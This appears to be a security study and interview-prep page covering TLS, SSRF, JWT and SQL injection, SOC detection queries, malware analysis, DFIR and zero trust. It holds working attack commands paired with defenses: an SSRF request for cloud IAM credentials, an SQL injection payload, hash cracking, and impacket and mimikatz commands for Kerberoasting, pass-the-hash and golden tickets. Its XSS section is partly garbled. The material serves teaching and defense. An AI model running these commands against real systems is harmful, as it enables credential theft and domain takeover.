TLS 1.3 Handshake

# TLS 1.3 Handshake (1 RTT)
# Client → Server: ClientHello (supported ciphers, key share)
# Server → Client: ServerHello + Certificate + CertificateVerify + Finished
#   - Selects cipher suite: TLS_AES_256_GCM_SHA384
#   - Sends public key (ECDH key share)
# Client → Server: Finished
# Connection established. Application data flows.

# Perfect Forward Secrecy (PFS): TLS 1.3 mandates ECDHE
# Each session uses a new ephemeral key pair
# Even if server private key is compromised later,
# past session data cannot be decrypted.

# Check server TLS configuration
openssl s_client -connect target.com:443 -tls1_3
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for weak ciphers (testssl.sh)
./testssl.sh --severity HIGH target.com

SSRF — Server-Side Request Forgery

# Vulnerable code (Python Flask)
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)   # SSRF! No validation!
    return response.content

# SSRF attack: extract AWS credentials
# GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# Response: {"AccessKeyId":"ASIA...", "SecretAccessKey":"..."}

# Secure version: allowlist approach
ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']

@app.route('/fetch')
def fetch_url_safe():
    url = request.args.get('url')
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        return 'Forbidden', 403
    if parsed.scheme not in ('http', 'https'):
        return 'Forbidden', 403
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.content

JWT Attacks

# JWT format: header.payload.signature (base64url encoded)
# header: {"alg":"HS256","typ":"JWT"}
# payload: {"sub":"user123","role":"user","iat":...}

# Attack 1: alg=none (remove signature)
# Tamper payload to role:"admin", set alg:"none", remove signature
# Vulnerable if server accepts alg:none

# Attack 2: RS256 → HS256 confusion
# If server has RSA public key and uses it as HMAC secret when alg=HS256
# Attacker signs token with public key using HS256

# Attack 3: Weak secret brute force
hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt  # crack JWT secret

# Fix: always validate algorithm header
import jwt
# Bad: jwt.decode(token, key)
# Good: jwt.decode(token, key, algorithms=["HS256"])  # whitelist algorithm

# Check JWT online: jwt.io (development only, never prod secrets!)

# Defenses
# 1. Escape output: use textContent not innerHTML

// SAFE

# 3. HttpOnly + Secure cookies (prevent JS cookie theft)

# 4. DOMPurify — sanitize HTML when you need to render it
import DOMPurify from 'dompurify';
div.innerHTML = DOMPurify.sanitize(userInput);

Vulnerable vs Secure Code

# ===== VULNERABLE =====
# Python (f-string concatenation)
query = f"SELECT * FROM users WHERE username='{username}'"
# Attack: username = ' OR '1'='1' --
# Result: SELECT * FROM users WHERE username='' OR '1'='1' --'
# Returns ALL users!

# ===== SECURE =====
# Parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# ORM (Django — always parameterized)
User.objects.filter(username=username)

# Java PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
ps.setString(1, username);

🛡️ SOC & SIEM

Incident Response, Splunk SPL

Incident Response Process (NIST SP 800-61)

  1. Preparation — IR plan, playbooks, tools, training
  2. Detection & Analysis — SIEM alerts, IOC matching, triage
  3. Containment — Short-term (isolate host), long-term (patch/change creds)
  4. Eradication — Remove malware, close vulnerabilities
  5. Recovery — Restore systems, monitor for recurrence
  6. Post-Incident Activity — Lessons learned, improve controls

Splunk SPL Queries

# Failed SSH logins (brute force detection)
index=linux sourcetype=syslog "Failed password"
| rex "Failed password for (?:invalid user )?(?P<user>\w+) from (?P<src_ip>[\d.]+)"
| stats count by src_ip, user
| where count > 10
| sort -count

# Top 10 source IPs by failed logins
index=linux "Failed password"
| stats count by src_ip | sort -count | head 10

# Detect PowerShell execution
index=windows EventCode=4688 (CommandLine="*powershell*" OR CommandLine="*cmd.exe*")
| rex field=CommandLine "(?P<cmdline>.*)"
| eval suspicious=if(match(cmdline,"(?i)(bypass|encoded|hidden|download|invoke-expression)"), "YES", "NO")
| where suspicious="YES"
| table _time, ComputerName, user, cmdline

# New admin user created
index=windows EventCode=4720 OR EventCode=4728
| eval action=case(EventCode=4720, "Account Created", EventCode=4728, "Added to Admins")
| table _time, ComputerName, SubjectUserName, TargetUserName, action

🎯 Cybersecurity Interview Questions

Top 15 Security Interview Q&A

Q1: Difference between vulnerability, threat, and risk?

Vulnerability: Weakness in a system (unpatched software, misconfiguration).
Threat: Potential actor/event that could exploit vulnerability (hacker, malware, fire).
Risk: Risk = Threat × Vulnerability × Impact. It's the potential for harm.

Q2: What is the difference between symmetric and asymmetric encryption?

Symmetric: Same key for encrypt/decrypt (AES). Fast, great for large data. Key distribution problem.
Asymmetric: Public key encrypts, private key decrypts (RSA, ECDSA). Solves key distribution. Slow. Used in TLS handshake to exchange symmetric session key.

Q3: How does a man-in-the-middle attack work?

Attacker positions between client and server. Intercepts traffic by ARP poisoning (LAN), DNS spoofing, or rogue hotspot. Relays and modifies traffic. Prevented by: TLS (certificate validation), HSTS, certificate pinning, DNSSEC.

Q4: What is a SQL injection and how do you prevent it?

SQL injection: unsanitized user input changes SQL query logic. Prevention: parameterized queries/prepared statements (never string concatenation), input validation, WAF, least-privilege DB user (no DROP/CREATE), stored procedures.

Q5: Explain the difference between IDS and IPS

IDS (Intrusion Detection System): Monitors traffic, generates alerts, PASSIVE — cannot block.
IPS (Intrusion Prevention System): Inline deployment, ACTIVE — can block malicious traffic in real-time. IPS is effectively an IDS that can act.

Q6: What is CSRF and how is it prevented?

CSRF forces authenticated user's browser to make unintended requests (e.g., transfer funds). Prevention: CSRF tokens (per-form random value verified server-side), SameSite cookie attribute (Strict/Lax), verify Origin/Referer header, custom headers (X-Requested-With: XMLHttpRequest).

Q7: What steps would you take if you discovered a security breach?

Follow IR process: 1) Contain (isolate affected systems — disconnect from network, do NOT shut down if forensics needed), 2) Preserve evidence (memory dump, logs), 3) Notify (security team, legal, management), 4) Eradicate (remove malware, close entry point), 5) Recover (restore from clean backup), 6) Post-incident (root cause analysis, improve controls).

Q8: What is the difference between black box, white box, and grey box testing?

Black box: No prior knowledge of target. Simulates external attacker. Realistic but may miss edge cases.
White box: Full access (source code, architecture, creds). Most thorough. Less realistic.
Grey box: Partial info (credentials, API docs, architecture diagram). Balances depth and realism.

Static Analysis Workflow

# 1. File identification (NEVER execute unknown malware directly)
file malware.exe
md5sum malware.exe && sha256sum malware.exe

# 2. String extraction
strings -a malware.exe | grep -E "(http|cmd|powershell|registry|CreateProcess)"
floss malware.exe  # FLOSS decodes obfuscated strings

# 3. PE header analysis (Windows executables)
pecheck malware.exe          # sections, imports, exports
pestudio malware.exe         # GUI: imports, strings, indicators

# 4. Import table (what Windows APIs does it call?)
# Suspicious imports:
# CreateRemoteThread    → process injection
# VirtualAllocEx        → shellcode injection
# WriteProcessMemory    → code injection
# RegSetValueEx         → persistence via registry
# WinExec / CreateProcess → execution
# InternetOpenUrl       → C2 communication

# 5. Entropy analysis (high entropy = packed/encrypted)
python3 -c "
import math, sys
data = open(sys.argv[1],'rb').read()
freq = [data.count(bytes([i]))/len(data) for i in range(256)]
H = -sum(p*math.log2(p) for p in freq if p)
print(f'Entropy: {H:.2f}/8.0')  # >7.2 = likely packed
" malware.exe

DFIR — Digital Forensics & Incident Response

# Evidence collection order (volatility: RAM > swap > disk)
# 1. Memory capture (before shutdown — RAM is volatile)
winpmem_mini.exe memory.raw

# 2. Live system triage
netstat -anob         # active connections with PID
tasklist /v           # running processes
wmic process list full > processes.txt
reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run persistence.reg

# 3. Disk image (write-blocker required for legal admissibility)
dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
sha256sum /evidence/disk.img > disk.img.sha256

# 4. Timeline creation
log2timeline.py plaso.db /evidence/disk.img
psort.py -o l2tcsv plaso.db "date > '2024-01-01'" > timeline.csv

# 5. Windows artifact locations

Chain of Custody & Evidence Handling

  • Document: who collected, when, where, what hash, chain of custody form
  • Write-block all storage media before imaging
  • Use forensically sound tools (FTK, Autopsy, Sleuth Kit)
  • Never perform analysis on original evidence — always work from verified copy
  • Maintain hash verification at every transfer step

🛡️ Zero Trust Architecture & IAM

Never Trust, Always Verify

Zero Trust Principles (NIST SP 800-207)

  • All resources treated as external — no implicit trust based on network location
  • Least privilege per-request — access granted to specific resource for specific session only
  • Continuous verification — re-authenticate, re-authorize for every transaction
  • Assume breach — minimize blast radius, micro-segment everything
  • Device health check — only allow compliant, managed devices

Identity Attacks & Defenses

# Kerberoasting — attack on service accounts
# Attacker requests TGS for SPN, cracks offline
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1 -request
hashcat -m 13100 hashes.txt rockyou.txt  # crack RC4 TGS
# Defense: use managed service accounts (gMSA), 30-char random passwords

# AS-REP Roasting — accounts without pre-auth required
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass
# Defense: require Kerberos pre-authentication for all accounts

# Pass-the-Hash (PtH)
impacket-psexec Administrator@10.0.0.5 -hashes :ntlm_hash
# Defense: disable NTLM, enable Protected Users group, Credential Guard

# Golden Ticket — compromise krbtgt account
mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-... /krbtgt:hash /ticket:golden.kirbi"
# Defense: rotate krbtgt password twice, monitor for anomalous TGT lifetimes

PAM — Privileged Access Management

  • Just-in-time (JIT) access: elevate privileges only when needed, auto-expire
  • Privileged access workstations (PAW): dedicated hardened machines for admin tasks
  • Session recording: full video/keylog of all privileged sessions
  • Vault credentials: all service account passwords stored in Vault/CyberArk, never in code
  • Break-glass accounts: emergency access with full audit trail

Semgrep SAST Rules

# Custom Semgrep rule: detect hardcoded AWS keys
rules:
  - id: hardcoded-aws-key
    pattern: |
      $KEY = "AKIA..."
    message: Hardcoded AWS access key detected — use IAM roles or Secrets Manager
    severity: ERROR
    languages: [python, javascript, go, java]

  - id: sql-injection-format-string
    pattern: |
      $DB.execute("SELECT ... " + $USER_INPUT)
    message: SQL injection via string concatenation — use parameterized queries
    severity: ERROR
    languages: [python]

  - id: insecure-deserialization
    pattern: |
      pickle.loads($DATA)
    message: Unsafe deserialization — never unpickle untrusted data
    severity: WARNING
    languages: [python]
